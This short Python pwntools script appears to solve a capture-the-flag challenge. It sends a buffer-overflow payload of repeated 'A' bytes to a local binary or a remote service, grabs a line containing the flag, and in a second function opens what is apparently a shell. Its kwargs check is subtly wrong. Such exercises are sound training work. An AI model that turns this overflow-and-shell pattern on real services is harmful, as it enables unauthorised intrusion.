from pwn import *
import os
# context.log_level = "DEBUG"


def get_flag(**kwargs):
    # Connect to the remote service
    if "ip" and "port" in kwargs:
        r = remote(kwargs["ip"], kwargs["port"])
    else:
        r = process([os.path.join(os.getcwd(), "examples/pwn_automation/challenge/challenge")])
    # Send the payload
    r.sendline(b'A' * (150 - 1))

    try:
        flag = r.recvline_contains(b"cueh")
    except EOFError:
        flag = b""

    if len(flag) > 0:
        print(flag.decode())

    r.close()

    return flag


def get_shell(ip, port):
    # Connect to the remote service
    r = remote(ip, port)

    # Send the payload
    r.sendline(b'A' * (160 - 1))

    return r


